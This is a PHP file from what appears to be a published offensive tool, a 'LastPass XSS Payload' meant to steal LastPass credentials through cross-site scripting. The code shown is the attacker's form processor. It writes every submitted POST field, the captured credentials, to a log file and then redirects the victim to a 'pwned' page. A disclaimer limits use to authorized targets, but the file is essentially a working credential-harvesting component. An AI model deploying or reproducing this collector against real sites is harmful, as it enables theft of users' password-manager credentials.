<!--

LastPass XSS Payload
greg . foss [at] owasp . org
4/24/2014
v 0.1 Beta

The code below can be used to exploit XSS vulnerabilities and steal LastPass credentials.

# ONLY USE THIS PAYLOAD LEGALLY, AGAINST AUTHORIZED TARGETS
# THE DEVELOPER OF THIS PAYLOAD IS NOT LIABLE FOR ILLEGAL/QUESTIONABLE ACTIVITIES CONDUCTED WITH THIS TOOL
# BY USING THIS TOOL, YOU AGREE THAT YOU HAVE READ AND UNDERSTAND THESE TERMS

How To:
	This is the basic form processor which captures the users credentials following the 'Login.php' form submission.

-->
<?php
// the name of the file you're writing to
$myFile = "xss.log";

// opens the file for appending (file must already exist)
$fh = fopen($myFile, 'a');

// Makes a CSV list of your post data
$comma_delimited_list = implode(", ", $_POST) . "\n";

// Write to the file
fwrite($fh, $comma_delimited_list);

// You're done
fclose($fh);

// redirect for lolz
header('Location: attrib/pwned.html' );
?>
</body></html>